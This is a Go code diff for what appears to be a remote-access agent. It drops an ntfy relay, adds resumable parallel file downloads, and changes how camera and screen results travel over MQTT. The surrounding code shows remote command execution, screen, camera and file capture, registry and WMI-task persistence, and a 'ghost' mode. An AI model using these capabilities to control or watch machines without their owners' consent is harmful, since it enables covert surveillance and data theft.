@@ -318,7 +318,7 @@ func splitCmd(cmdStr string) (string, string) {
 }
 
 // isKillCmd reports whether cmdStr asks the agent process to go quiet.
-// kill-agent is intercepted in agent main on every transport (direct, ntfy,
+// kill-agent is intercepted in agent main on every transport (direct,
 // MQTT) before commands.Execute ever sees it. Quiet is temporary: the
 // supervisor restarts the process, so this never deletes anything.
 func isKillCmd(cmdStr string) bool {
@@ -347,7 +347,7 @@ func exitSoon(via string) {
 // fileDlStream answers one download request by streaming file chunks via
 // send (transport-specific). Out-of-order arrival is fine: the UI
 // reassembles by seq and re-requests gaps from the first missing seq.
-func fileDlStream(path string, fromSeq, chunkRaw int, thumb bool, send func(protocol.Message) error) {
+func fileDlStream(path string, fromSeq int, haveStr string, chunkRaw int, thumb bool, send func(protocol.Message) error) {
 	if chunkRaw <= 0 {
 		chunkRaw = 512 * 1024
 	}
@@ -375,17 +375,106 @@ func fileDlStream(path string, fromSeq, chunkRaw int, thumb bool, send func(prot
 		return
 	}
 	log.Printf("[*] File download %s (%s, %d bytes, %d chunks from %d)", path, displayName, man.Size, man.Total, fromSeq)
+	// Selective resume: the requester lists ranges it already holds; send
+	// only what's missing instead of a wasteful fromSeq..end suffix.
+	have := map[int]bool{}
+	if haveStr != "" {
+		have = commands.ParseRanges(haveStr, man.Total)
+	}
+	var seqs []int
 	for seq := fromSeq; seq < man.Total; seq++ {
-		data, err := commands.FileDlChunk(realPath, seq, chunkRaw)
-		if err != nil {
-			_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, Error: err.Error()})
-			return
-		}
-		if err := send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, FileSize: man.Size, FileSHA: man.SHA, Data: data}); err != nil {
-			log.Printf("[!] file-dl send: %v", err)
-			return
+		if !have[seq] {
+			seqs = append(seqs, seq)
 		}
 	}
+	if len(seqs) == 0 {
+		return // requester already holds everything
+	}
+	// Relay-sized chunks go out over 2 lanes with pacing (back-to-back
+	// 175KB QoS0 publishes collapse on public brokers — same lesson as
+	// update pushes); direct-sized chunks stay serial at full speed.
+	lanes, pacing := 1, time.Duration(0)
+	if chunkRaw <= 128*1024 {
+		lanes, pacing = 2, 40*time.Millisecond
+	}
+	if lanes == 1 {
+		for _, seq := range seqs {
+			data, err := commands.FileDlChunk(realPath, seq, chunkRaw)
+			if err != nil {
+				_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, Error: err.Error()})
+				return
+			}
+			if err := send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, FileSize: man.Size, FileSHA: man.SHA, Data: data}); err != nil {
+				log.Printf("[!] file-dl send: %v", err)
+				return
+			}
+		}
+		return
+	}
+	var wg sync.WaitGroup
+	var failOnce sync.Once
+	failed := atomic.Bool{}
+	jobs := make(chan int, len(seqs))
+	for _, seq := range seqs {
+		jobs <- seq
+	}
+	close(jobs)
+	for l := 0; l < lanes; l++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for seq := range jobs {
+				if failed.Load() {
+					return
+				}
+				data, err := commands.FileDlChunk(realPath, seq, chunkRaw)
+				if err != nil {
+					failOnce.Do(func() {
+						failed.Store(true)
+						_ = send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, Error: err.Error()})
+					})
+					return
+				}
+				if err := send(protocol.Message{Type: protocol.TypeFileDlChunk, FilePath: path, FileSeq: seq, FileTotal: man.Total, FileSize: man.Size, FileSHA: man.SHA, Data: data}); err != nil {
+					failOnce.Do(func() {
+						failed.Store(true)
+						log.Printf("[!] file-dl send: %v", err)
+					})
+					return
+				}
+				if pacing > 0 {
+					time.Sleep(pacing)
+				}
+			}
+		}()
+	}
+	wg.Wait()
+}
+
+// sendCamFrags delivers a command result, splitting multi-line CAMFRAG
+// camera results into one output per fragment so each rides its own QoS0
+// publish (a single giant publish is all-or-nothing loss). All other
+// results pass through as one output.
+func sendCamFrags(cmdID, result, errStr string, send func(protocol.Message) error) {
+	if strings.Contains(result, "CAMFRAG ") {
+		lines := strings.Split(result, "\n")
+		if len(lines) > 1 {
+			allFrag := true
+			for _, ln := range lines {
+				if !strings.HasPrefix(strings.TrimSpace(ln), "CAMFRAG ") {
+					allFrag = false
+					break
+				}
+			}
+			if allFrag {
+				for _, ln := range lines {
+					_ = send(protocol.Message{Type: protocol.TypeOutput, Result: strings.TrimSpace(ln), Error: errStr, CmdID: cmdID})
+				}
+				return
+			}
+		}
+	}
+	_ = send(protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr, CmdID: cmdID})
 }
 
 // updateOutput builds an output message from a result/error pair (shared
@@ -400,16 +489,18 @@ func updateOutput(res string, err error) protocol.Message {
 	return protocol.Message{Type: protocol.TypeOutput, Result: res}
 }
 
-// execCommand runs a command string and builds the output message.
-// maxBytes caps the result (direct TLS allows 1MB, relays less).
-// A duplicate id (two controllers, same command) returns suppressed.
-func execCommand(cmdStr, cmdID string, maxBytes int, truncNote string) (protocol.Message, bool) {
+// execCommand runs a command string and delivers the output message(s)
+// via send (CAMFRAG camera results split per fragment). maxBytes caps the
+// result (direct TLS allows 1MB, relays less). A duplicate id (two
+// controllers, same command) sends an empty ack and returns suppressed.
+func execCommand(cmdStr, cmdID string, maxBytes int, truncNote string, send func(protocol.Message) error) bool {
 	t := time.Now()
 	cmdName, args := splitCmd(cmdStr)
 	result, suppressed, err := commands.ExecuteChecked(cmdID, cmdName, args)
 	if suppressed {
 		log.Printf("[*] Duplicate %s suppressed", cmdID)
-		return protocol.Message{}, true
+		_ = send(protocol.Message{Type: protocol.TypeOutput, CmdID: cmdID})
+		return true
 	}
 	dlog.Printf("[cmd] %q took %dms err=%v", cmdName, time.Since(t).Milliseconds(), err)
 	errStr := ""
@@ -423,7 +514,8 @@ func execCommand(cmdStr, cmdID string, maxBytes int, truncNote string) (protocol
 	if len(result) > maxBytes {
 		result = result[:maxBytes] + truncNote
 	}
-	return protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr, CmdID: cmdID}, false
+	sendCamFrags(cmdID, result, errStr, send)
+	return false
 }
 
 func mustJSON(v interface{}) json.RawMessage {
@@ -444,7 +536,8 @@ func nextFrameSeq() uint64 { return frameSeq.Add(1) }
 // a bound, a weak remote PC melts under 20 simultaneous full-screen
 // captures + JPEG encodes and effective fps collapses. Full house drops
 // the frame with an empty heartbeat so the UI pipe keeps flowing.
-var captureSem = make(chan struct{}, 3)
+// Cap 6 (was 3): the 20-deep UI pipe starved at 3 on healthy remotes.
+var captureSem = make(chan struct{}, 6)
 
 func captureSlot() bool {
 	select {
@@ -817,7 +910,8 @@ func (a *agent) connectOnce() error {
 		log.Printf("[!] All direct dials failed: %v", dialErr)
 		err = dialErr
 	}
-	// MQTT relay (persistent outbound TCP, zero polling) before ntfy.
+	// MQTT relay (persistent outbound TCP). Ntfy was removed in v1.45:
+	// direct or MQTT, nothing else.
 	if err != nil {
 		log.Printf("[*] All direct dials failed, trying MQTT relay...")
 		if merr := a.connectViaMQTT(); merr != nil {
@@ -826,11 +920,6 @@ func (a *agent) connectOnce() error {
 		} else {
 			return nil // connectViaMQTT only returns on shutdown
 		}
-	}
-	// Ntfy relay final fallback (only our app, no open port, just HTTPS out)
-	if err != nil {
-		log.Printf("[*] All direct dials failed, trying ntfy relay %s...", relay.NtfyTopic)
-		return a.connectViaNtfy()
 	}
 	if err != nil {
 		return err
@@ -886,7 +975,7 @@ func (a *agent) connectOnce() error {
 				}(msg)
 			case protocol.TypeFileDlReq:
 				go func(m protocol.Message) {
-					fileDlStream(m.FilePath, m.FileFrom, m.FileChunk, m.FileThumb, a.send)
+					fileDlStream(m.FilePath, m.FileFrom, m.FileHave, m.FileChunk, m.FileThumb, a.send)
 				}(msg)
 			case protocol.TypeFileUlBegin:
 				go func(m protocol.Message) {
@@ -943,12 +1032,8 @@ func (a *agent) connectOnce() error {
 					if len(result) > 1024*1024 {
 						result = result[:1024*1024] + "\n... truncated"
 					}
-				resp := protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr, CmdID: m.CmdID}
-				if err := a.send(resp); err != nil {
-						log.Printf("[!] send output: %v", err)
-					} else {
-						log.Printf("[*] Sent output (%d bytes)", len(result))
-					}
+				sendCamFrags(m.CmdID, result, errStr, a.send)
+				log.Printf("[*] Sent output (%d bytes)", len(result))
 				}(msg)
 			case protocol.TypeScreenshotRequest:
 			log.Printf("[*] Screenshot requested (quality=%d monitor=%d all=%v scale=%v)", msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale)
@@ -1090,224 +1175,8 @@ func (a *agent) connectOnce() error {
 	}
 }
 
-func (a *agent) connectViaNtfy() error {
-	hn, user := hostnameAndUser()
-	me := "agent:" + hn
-	relaySessionActive.Store(true)
-	defer relaySessionActive.Store(false)
-	// E2E key for relay payloads (best effort; plaintext fallback keeps
-	// old controllers working). Sent with every announce for rotation.
-	if _, err := commands.E2EInitControllerKey(a.caFile); err == nil {
-		log.Printf("[*] E2E key ready for relay payloads")
-	} else {
-		log.Printf("[*] E2E unavailable (%v), relay payloads stay plaintext", err)
-	}
-	announce := func() {
-		_ = relay.PublishTo(me, "controller", helloMsg(hn, user))
-		if wrapped, ok := commands.E2EWrapped(); ok {
-			_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeKeyExchange, Hostname: hn, Instance: instanceID(), Data: wrapped})
-		}
-	}
-	log.Printf("[*] Ntfy relay: publishing connect %s/%s", hn, user)
-	announce()
-	// Long-poll in its own goroutine: relay.Poll blocks up to ~60s when
-	// idle (one hanging GET, not the old 900ms hot loop that got us banned).
-	inbox := make(chan relay.Envelope, 64)
-	go func() {
-		for {
-			select {
-			case <-a.closing:
-				return
-			default:
-			}
-			// Only messages addressed to us (or broadcast "") — fixes
-			// cross-talk where every agent executed every command.
-			envs, err := relay.Poll(me, hn)
-			if err != nil {
-				log.Printf("[ntfy] poll: %v", err)
-				select {
-				case <-a.closing:
-					return
-				case <-time.After(2 * time.Second):
-				}
-				continue
-			}
-			for _, env := range envs {
-				select {
-				case inbox <- env:
-				case <-a.closing:
-					return
-				}
-			}
-		}
-	}()
-	mouseTicker := time.NewTicker(2 * time.Second) // throttled: ntfy is rate-limited
-	defer mouseTicker.Stop()
-	announceTicker := time.NewTicker(announceEvery(25 * time.Second)) // re-announce so restarted controllers find us (quiet: presence is cheap, chatter isn't)
-	defer announceTicker.Stop()
-	// nout publishes agent->controller messages, sealed when E2E is active.
-	nout := func(msg protocol.Message) {
-		_ = relay.PublishEnvelope(commands.E2EEnvelope(me, "controller", msg, nowMillis()))
-	}
-	lastX, lastY := -1, -1
-	for {
-		select {
-		case <-a.closing:
-			return nil
-		case <-announceTicker.C:
-			if a.quietRemain() > 0 {
-				continue // stay quiet: don't re-announce a session the user ended
-			}
-			announce()
-			case env := <-inbox:
-			{
-				payload := env.Payload
-				if env.Enc {
-					plain, ok := commands.E2EOpen(payload)
-					if !ok {
-						log.Printf("[!] ntfy: undecryptable payload, dropped")
-						continue
-					}
-					payload = plain
-				}
-				var msg protocol.Message
-				if err := json.Unmarshal(payload, &msg); err != nil {
-					continue
-				}
-				if !strings.HasPrefix(env.From, "controller") {
-					continue
-				}
-				if msg.Target != "" && msg.Target != hn && msg.Target != me {
-					continue
-				}
-				switch msg.Type {
-				case protocol.TypeConnected:
-					// Ignore acks meant for a different agent process.
-					if msg.ID != "" && !strings.Contains(msg.ID, hn) {
-						continue
-					}
-					if msg.E2E {
-						commands.E2EEnable(true)
-					}
-					noteAck(msg)
-					log.Printf("[*] Ntfy controller ack %s", msg.ID)
-				case protocol.TypeUpdateBegin:
-					log.Printf("[*] Ntfy update begin %s", msg.UpdateVer)
-					res, err := commands.StartAgentUpdate(msg.UpdateVer, msg.UpdateSize, msg.UpdateSHA, msg.UpdateTotal, msg.UpdateGzip, msg.UpdateChunk)
-					nout(updateOutput(res, err))
-				case protocol.TypeUpdateChunk:
-					res, err := commands.WriteUpdateChunk(msg.UpdateSeq, msg.Data)
-					if res == "" && err == nil {
-						continue
-					}
-					nout(updateOutput(res, err))
-				case protocol.TypeFileDlReq:
-					go fileDlStream(msg.FilePath, msg.FileFrom, msg.FileChunk, msg.FileThumb, func(m protocol.Message) error {
-						nout(m)
-						return nil
-					})
-				case protocol.TypeFileUlBegin:
-					res, err := commands.StartFileUl(msg.FilePath, msg.FileSize, msg.FileSHA, msg.FileTotal)
-					nout(updateOutput(res, err))
-				case protocol.TypeFileUlChunk:
-					res, err := commands.WriteFileUlChunk(msg.FileSeq, msg.Data, msg.FileChunk)
-					if res == "" && err == nil {
-						continue
-					}
-					nout(updateOutput(res, err))
-				case protocol.TypeCommand:
-					log.Printf("[*] Ntfy command: %s", msg.Cmd)
-					if isKillCmd(msg.Cmd) {
-						_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeOutput, Result: "agent process quieting (kill-agent is temporary — supervisor restarts it)"})
-						exitSoon("ntfy")
-						continue
-					}
-					if handleSelfDelete(msg.Cmd, func(res, errStr string) {
-						nout(protocol.Message{Type: protocol.TypeOutput, Result: res, Error: errStr, CmdID: msg.CmdID})
-					}) {
-						continue
-					}
-					cmdName := strings.TrimSpace(msg.Cmd)
-					args := ""
-					if idx := strings.Index(cmdName, " "); idx != -1 {
-						args = strings.TrimSpace(cmdName[idx+1:])
-						cmdName = strings.TrimSpace(cmdName[:idx])
-					}
-				result, suppressed, err := commands.ExecuteChecked(msg.CmdID, cmdName, args)
-				if suppressed {
-					log.Printf("[*] Duplicate %s suppressed", msg.CmdID)
-					nout(protocol.Message{Type: protocol.TypeOutput, CmdID: msg.CmdID})
-					continue
-				}
-					errStr := ""
-					if err != nil {
-						errStr = err.Error()
-						if result == "" {
-							result = errStr
-							errStr = ""
-						}
-					}
-					if len(result) > 700*1024 {
-						result = result[:700*1024] + "\n... truncated (ntfy limit)"
-					}
-					nout(protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr, CmdID: msg.CmdID})
-				case protocol.TypeScreenshotRequest:
-					q := msg.Quality
-					if q <= 0 {
-						q = 70 // ntfy default: JPEG fits the relay cap
-					}
-					if msg.Tiles {
-						msgs, err := captureTiled(q, msg.Monitor, msg.AllMonitors, msg.Scale)
-						if err != nil {
-							nout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
-							continue
-						}
-						for _, m := range msgs {
-							nout(m)
-						}
-						continue
-					}
-					s0 := frameSeq.Load()
-					data, w, h, ox, oy, format, err := captureImage(q, msg.Monitor, msg.AllMonitors, msg.Scale)
-					if err != nil {
-						nout(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
-						continue
-					}
-					if frameSeq.Load() != s0 {
-						continue // superseded by a newer frame; UI would drop this one
-					}
-					b64 := base64.StdEncoding.EncodeToString(data)
-					if len(b64) > 700*1024 {
-						nout(protocol.Message{Type: protocol.TypeScreen, Error: "screen too large for ntfy relay (use direct connection)"})
-						continue
-					}
-					nout(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, OX: ox, OY: oy, Data: b64, Format: format, FSeq: nextFrameSeq()})
-				case protocol.TypePing:
-					_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypePong})
-				case protocol.TypeDisconnect:
-					// User ended the session: go quiet (outer loop honors
-					// quietUntil instead of reconnecting). PC untouched.
-					a.setQuiet(disconnectQuiet)
-					return nil
-				}
-			}
-		case <-mouseTicker.C:
-			if !modeCanMouse() {
-				continue
-			}
-			x, y := getMousePos()
-			if x == lastX && y == lastY {
-				continue
-			}
-			lastX, lastY = x, y
-			nout(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y})
-		case <-a.ghostEnd:
-			return nil // ghost window over: go dark until next cycle
-		}
-	}
-}
 
-// relaySessionActive marks a full relay session (MQTT/ntfy main loop) in
+// relaySessionActive marks a full relay session (MQTT main loop) in
 // progress. The listen-only loop below stands down while set, so two relay
 // paths never double-handle the same traffic.
 var relaySessionActive atomic.Bool
@@ -1361,7 +1230,15 @@ func relayListenOnce(a *agent, hn, user, me, caFile string) error {
 		log.Printf("[*] listen-only E2E key ready")
 	}
 	mout := func(msg protocol.Message) error {
-		return bus.Publish("out/"+hn, commands.E2EEnvelope(me, "controller", msg, nowMillis()))
+		env := commands.E2EEnvelope(me, "controller", msg, nowMillis())
+		// Small interactive frames fail fast (2s); bulk chunks and full
+		// outputs keep the 10s publish (a timeout aborts file streams).
+		switch msg.Type {
+		case protocol.TypeScreen, protocol.TypeTile, protocol.TypeMouse,
+			protocol.TypePing, protocol.TypePong:
+			return bus.PublishFast("out/"+hn, env)
+		}
+		return bus.Publish("out/"+hn, env)
 	}
 	discCh := make(chan struct{}, 1)
 	if err := bus.SubscribeCmd(func(env relay.Envelope) {
@@ -1401,12 +1278,7 @@ func relayListenOnce(a *agent, hn, user, me, caFile string) error {
 				}) {
 					return
 				}
-			resp, suppressed := execCommand(m.Cmd, m.CmdID, 1024*1024, "\n... truncated")
-			if suppressed {
-				_ = mout(protocol.Message{Type: protocol.TypeOutput, CmdID: m.CmdID})
-				return
-			}
-			_ = mout(resp)
+			execCommand(m.Cmd, m.CmdID, 1024*1024, "\n... truncated", mout)
 			}(msg)
 		case protocol.TypeScreenshotRequest:
 			go func(quality, monitor int, all bool, scale float64, tiles bool) {
@@ -1453,7 +1325,7 @@ func relayListenOnce(a *agent, hn, user, me, caFile string) error {
 			}(msg)
 		case protocol.TypeFileDlReq:
 			go func(m protocol.Message) {
-				fileDlStream(m.FilePath, m.FileFrom, m.FileChunk, m.FileThumb, mout)
+				fileDlStream(m.FilePath, m.FileFrom, m.FileHave, m.FileChunk, m.FileThumb, mout)
 			}(msg)
 		case protocol.TypeFileUlBegin:
 			go func(m protocol.Message) {
@@ -1508,7 +1380,7 @@ func relayListenOnce(a *agent, hn, user, me, caFile string) error {
 }
 
 // connectViaMQTT joins the MQTT relay (persistent outbound TCP 1883, zero
-// polling). Tried after direct dials fail, before the slower ntfy polling.
+// polling). Tried after direct dials fail.
 func (a *agent) connectViaMQTT() error {
 	hn, user := hostnameAndUser()
 	me := "agent:" + hn
@@ -1527,7 +1399,15 @@ func (a *agent) connectViaMQTT() error {
 	}
 	// mout publishes agent->controller messages, sealed when E2E is active.
 	mout := func(msg protocol.Message) error {
-		return bus.Publish("out/"+hn, commands.E2EEnvelope(me, "controller", msg, nowMillis()))
+		env := commands.E2EEnvelope(me, "controller", msg, nowMillis())
+		// Small interactive frames fail fast (2s); bulk chunks and full
+		// outputs keep the 10s publish (a timeout aborts file streams).
+		switch msg.Type {
+		case protocol.TypeScreen, protocol.TypeTile, protocol.TypeMouse,
+			protocol.TypePing, protocol.TypePong:
+			return bus.PublishFast("out/"+hn, env)
+		}
+		return bus.Publish("out/"+hn, env)
 	}
 
 	discCh := make(chan struct{}, 1) // user-ended session (callback runs on paho's thread)
@@ -1578,7 +1458,7 @@ func (a *agent) connectViaMQTT() error {
 			}(msg)
 		case protocol.TypeFileDlReq:
 			go func(m protocol.Message) {
-				fileDlStream(m.FilePath, m.FileFrom, m.FileChunk, m.FileThumb, mout)
+				fileDlStream(m.FilePath, m.FileFrom, m.FileHave, m.FileChunk, m.FileThumb, mout)
 			}(msg)
 		case protocol.TypeFileUlBegin:
 			go func(m protocol.Message) {
@@ -1617,14 +1497,13 @@ func (a *agent) connectViaMQTT() error {
 				}) {
 					return
 				}
-			resp, suppressed := execCommand(cmdStr, m.CmdID, 1024*1024, "\n... truncated")
-			if suppressed {
-				_ = mout(protocol.Message{Type: protocol.TypeOutput, CmdID: m.CmdID})
-				return
-			}
+			execCommand(cmdStr, m.CmdID, 1024*1024, "\n... truncated", func(resp protocol.Message) error {
 				if err := mout(resp); err != nil {
 					log.Printf("[!] MQTT publish output: %v", err)
+					return err
 				}
+				return nil
+			})
 			}(msg)
 		case protocol.TypeScreenshotRequest:
 			go func(quality, monitor int, all bool, scale float64, tiles bool) {
@@ -1772,12 +1651,6 @@ func runDialTest(primary, caFile string, insecure bool) {
 		conn.Close()
 		os.Exit(0)
 	}
-	fmt.Printf("ntfy %s ... ", relay.NtfyTopic)
-	if err := relay.PublishTo("agent:test", "controller", protocol.Message{Type: protocol.TypePing}); err != nil {
-		fmt.Printf("FAIL (%v)\n", err)
-		os.Exit(1)
-	}
-	fmt.Printf("OK (published)\n")
 	os.Exit(0)
 }
 
@@ -1873,9 +1746,9 @@ func main() {
 	insecure := flag.Bool("insecure", false, "skip TLS verification (for testing)")
 	fps := flag.Float64("fps", 0, "periodic screenshot FPS (0=on-demand only)")
 	persist := flag.Bool("persist", false, "install registry persistence and exit")
-	ntfyTopic := flag.String("ntfy", "", "ntfy relay topic (empty = default)")
-	ntfyServer := flag.String("ntfy-server", "", "ntfy relay host (empty = default)")
-	ntfyOnly := flag.Bool("ntfy-only", false, "skip direct dials, use ntfy relay only (mobile: saves battery/time)")
+	ntfyTopic := flag.String("ntfy", "", "REMOVED in v1.45 (ntfy relay deleted); accepted and ignored")
+	ntfyServer := flag.String("ntfy-server", "", "REMOVED in v1.45 (ntfy relay deleted); accepted and ignored")
+	ntfyOnly := flag.Bool("ntfy-only", false, "REMOVED in v1.45 (ntfy relay deleted); accepted and ignored")
 	mqttOnly := flag.Bool("mqtt-only", false, "skip direct dials, use MQTT relay only")
 	watchMode := flag.Bool("watch", false, "run as supervisor: keep the agent alive, no network")
 	wmiHeal := flag.Bool("wmi-heal", false, "repair tasks+Run keys from local XMLs and exit (WMI timer target)")
@@ -1897,11 +1770,8 @@ func main() {
 		log.Printf("[*] Agent mode: %s", agentMode)
 	}
 
-	if *ntfyServer != "" {
-		relay.SetServer(*ntfyServer)
-	}
-	if *ntfyTopic != "" {
-		relay.SetTopic(*ntfyTopic)
+	if *ntfyServer != "" || *ntfyTopic != "" || *ntfyOnly {
+		log.Printf("[!] ntfy relay was removed in v1.45 — ntfy flags ignored (direct/MQTT only)")
 	}
 	// controller.txt next to exe overrides the compiled default (unless the
 	// flag was explicitly changed from the default).
@@ -2017,7 +1887,7 @@ func main() {
 	// controller house can reach this agent through the shared bus.
 	// Relay-only modes run their own full session; the listener stands down
 	// whenever one is active. Ghost mode skips it: no sockets between wakes.
-	if !*ntfyOnly && !*mqttOnly && agentMode != commands.ModeGhost {
+	if !*mqttOnly && agentMode != commands.ModeGhost {
 		hn0, user0 := hostnameAndUser()
 		me0 := "agent:" + hn0
 		ca0 := *caFile
@@ -2052,20 +1922,6 @@ func main() {
 		return true
 	}
 
-	if *ntfyOnly {
-		log.Printf("[*] ntfy-only mode: skipping direct dials")
-		for {
-			if !waitQuiet() {
-				return
-			}
-			_ = ag.connectViaNtfy()
-			select {
-			case <-ag.closing:
-				return
-			default:
-			}
-		}
-	}
 	if *mqttOnly {
 		log.Printf("[*] mqtt-only mode: skipping direct dials")
 		for {
